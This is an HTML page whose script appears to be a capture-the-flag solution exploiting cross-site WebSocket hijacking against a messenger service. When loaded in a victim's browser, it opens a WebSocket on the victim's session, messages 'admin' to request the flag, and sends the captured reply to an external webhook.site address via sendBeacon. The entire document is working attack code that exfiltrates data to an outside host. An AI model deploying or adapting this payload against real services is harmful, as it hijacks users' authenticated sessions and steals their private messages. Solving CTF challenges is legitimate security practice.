<!DOCTYPE html>
<html>
<body>
<script>
const HOOK = 'https://webhook.site/7cf33045-2392-42a9-80d5-ef4a7ea32395';

function log(msg) {
  navigator.sendBeacon(HOOK + '?log=' + encodeURIComponent(msg));
}

log('start');

const ws = new WebSocket('wss://vka-messenger.ru/ws');

ws.onopen = () => log('ws_open');
ws.onerror = () => log('ws_error');

const state = {};

ws.onmessage = (e) => {
  const msg = JSON.parse(e.data);
  log('msg_' + msg.type);

  if (msg.type === 'hello') {
    ws.send(JSON.stringify({ op: 'open_dm', username: 'admin' }));
  }

  if (msg.type === 'dm_opened' && !state.sent) {
    state.sent = true;
    state.chatId = msg.chat_id;
    ws.send(JSON.stringify({ op: 'send_message', chat_id: msg.chat_id, body: 'flag' }));
  }

  if (msg.type === 'message' && msg.message?.body?.includes('vkactf{')) {
    log('FLAG_' + msg.message.body);
    navigator.sendBeacon(HOOK + '?flag=' + encodeURIComponent(msg.message.body));
    window.__desklineDone = true;
  }
};
</script>
</body>
</html>
